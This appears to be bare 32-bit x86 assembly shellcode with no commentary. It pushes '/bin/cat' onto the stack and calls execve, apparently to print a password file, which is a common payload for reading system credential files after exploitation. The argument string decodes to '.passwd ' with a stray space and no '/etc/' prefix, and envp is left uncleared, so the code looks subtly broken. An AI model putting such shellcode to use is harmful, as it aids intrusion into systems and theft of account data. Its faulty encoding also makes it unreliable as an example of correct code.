BITS 32

global _start

_start:
	xor eax, eax
	push eax
	push 0x7461632f
	push 0x6e69622f
	mov ebx, esp
	push eax
	push 0x20647773
	push 0x7361702e
	mov ecx, esp
	push eax
	push ecx
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80


